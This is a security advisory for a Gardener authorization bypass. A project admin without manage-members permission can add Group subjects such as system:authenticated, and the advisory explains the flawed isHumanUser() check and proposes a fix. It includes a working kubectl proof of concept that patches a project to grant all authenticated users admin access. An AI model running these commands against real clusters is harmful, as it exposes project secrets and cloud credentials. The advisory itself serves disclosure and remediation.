# Gardener: Authorization Bypass via Group Subject Injection

- GHSA: GHSA-gfjv-gqf2-c888
- CVE: CVE-2026-79767
- Published: 2026-09-22T20:40:38Z
- GHSA severity: medium
- CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:H/A:N (5.5)
- CWE: CWE-863
- Packages: go:github.com/gardener/gardener, go:gardener/gardener, go:gardener/gardener
- Source: https://github.com/advisories/GHSA-gfjv-gqf2-c888

---

## Overview
The `manage-members` custom verb authorization check in the Gardener API server's `customverbauthorizer` admission plugin can be bypassed by adding `Group` or `ServiceAccount` subjects to a Project's member list. The check is documented as controlling "human users or groups", but the implementation only gates changes to `User`-kind subjects. A project admin (without `manage-members` permission) can add arbitrary Group subjects - including `system:authenticated` - granting all authenticated users full project-level access.
## Technical Details
The official Gardener documentation at `docs/usage/project/projects.md:90-92` explicitly states:
<img width="2090" height="290" alt="image" src="https://github.com/user-attachments/assets/744f5d6f-1e03-47b5-9dc5-36f20b7e6f4b" />

However, the `mustCheckProjectMembers()` function at `admission.go` compares old and new member lists using `findHumanUsersWithRoles()`, which only tracks subjects where `isHumanUser()` returns true:
```go
func mustCheckProjectMembers(oldMembers, members []core.ProjectMember, owner *rbacv1.Subject, userInfo user.Info) bool {
    if apiequality.Semantic.DeepEqual(oldMembers, members) {
        return false
    }
    if userIsOwner(userInfo, owner) {
        return false
    }
    var oldHumanUsers, newHumanUsers = findHumanUsersWithRoles(oldMembers), findHumanUsersWithRoles(members)
    // ...
    return !oldHumanUsers.Equal(newHumanUsers)
}
```
The `isHumanUser()` function at `admission.go` only matches `Kind == "User"`:
```go
func isHumanUser(subject rbacv1.Subject) bool {
    return subject.Kind == rbacv1.UserKind && !strings.HasPrefix(subject.Name, serviceaccount.ServiceAccountUsernamePrefix)
}
```
Kind: "Group" subjects are NOT matched by `isHumanUser()`, making Group member changes invisible to the authorization check. 
A project admin without manage-members permission can freely add or remove Group members.

## Steps to reproduce
<img width="4322" height="1395" alt="image" src="https://github.com/user-attachments/assets/60edacce-9810-4545-8198-a96cd072616c" />

---

_Proof of concept:_
1. Verify current project membership and confirm the owner has `manage-members` permission:
```bash
# Project members before the test:
$ kubectl get project local -o yaml
# members:
#   - apiGroup: rbac.authorization.k8s.io
#     kind: User
#     name: admin-user
#     role: admin
#     roles:
#     - owner

# Confirm the owner CAN manage-members (expected)
$ kubectl auth can-i manage-members projects.core.gardener.cloud/local --as=admin-user
yes
```
2. Add a second admin user (`test-admin-user`) to the project WITHOUT the `uam` role, then confirm they lack `manage-members`:
```bash
# After adding test-admin-user as admin (no uam role):
$ kubectl get project local -o yaml
# members:
#   - apiGroup: rbac.authorization.k8s.io
#     kind: User
#     name: admin-user
#     role: admin
#     roles:
#     - owner
#   - apiGroup: rbac.authorization.k8s.io
#     kind: User
#     name: test-admin-user
#     role: admin

# Confirm test-admin-user does NOT have manage-members
$ kubectl auth can-i manage-members projects.core.gardener.cloud/local --as=test-admin-user
no
```
3. Verify `test-admin-user` cannot add a human User member (the check works for Users):
```bash
$ kubectl patch --as=test-admin-user project local --type=merge -p '{
  "spec": {
    "members": [
      {
        "kind": "User",
        "apiGroup": "rbac.authorization.k8s.io",
        "name": "new-human-user@example.com",
        "role": "viewer"
      }
    ]
  }
}'
Error from server (Forbidden): [projects.core.gardener.cloud](https://projects.core.gardener.cloud/) "local" is forbidden: user "test-admin-user" is not allowed to manage human users or groups in .spec.members for "projects"
```
4. Bypass the check by adding a Group subject instead:
```bash
# This should be denied but ISN'T - the manage-members check is bypassed
$ kubectl patch project local --as=test-admin-user --type=json -p '[
  {
    "op": "add",
    "path": "/spec/members/-",
    "value": {
      "kind": "Group",
      "apiGroup": "rbac.authorization.k8s.io",
      "name": "system:authenticated",
      "role": "admin",
      "roles": ["admin"]
    }
  }
]'

project.core.gardener.cloud/local patched
```
5. Verify the Group was added to project members:
```bash
$ kubectl get project local -o yaml
# members:
#   - apiGroup: rbac.authorization.k8s.io
#     kind: User
#     name: admin-user
#     role: admin
#     roles:
#     - owner
#   - apiGroup: rbac.authorization.k8s.io
#     kind: User
#     name: test-admin-user
#     role: admin
#   - apiGroup: rbac.authorization.k8s.io
#     kind: Group
#     name: system:authenticated
#     role: admin
```
6. Demonstrate the impact - any authenticated user now has project access:
```bash
# As a random user 
$ kubectl --as=random-user@example.com get shoots -n garden-local
NAME    CLOUDPROFILE   PROVIDER   REGION   K8S VERSION   HIBERNATION   LAST OPERATION            STATUS    AGE
local   local          local      local    1.35.0        Awake         Create Succeeded (100%)   healthy   30m
```
>_Note: `random-user@example.com` does not exist as a real user. However, the Kubernetes `--as` global flag performs user impersonation which is treated as a successfully authenticated request, automatically adding the `system:authenticated` group. Since `system:authenticated` was added as a project admin member, this non-existent user now has full admin access to the project including all Shoots, Secrets, and cloud provider credentials._


---
## Security Impact
- Unauthorized access expansion: A project admin can grant project-level access to ANY Kubernetes group, including `system:authenticated` (all authenticated users) or `system:unauthenticated` (all unauthenticated users).
## Patching & Remediation
1. **Fix `isHumanUser()` to include Groups**: The function should match the documented behavior. Change:
    ```go
    func isHumanUser(subject rbacv1.Subject) bool {
        return subject.Kind == rbacv1.UserKind && !strings.HasPrefix(subject.Name, serviceaccount.ServiceAccountUsernamePrefix)
    }
    ```
    To:
    ```go
    func isNonServiceAccountSubject(subject rbacv1.Subject) bool {
        if subject.Kind == rbacv1.GroupKind {
            return true
        }
        return subject.Kind == rbacv1.UserKind && !strings.HasPrefix(subject.Name, serviceaccount.ServiceAccountUsernamePrefix)
    }
    ```
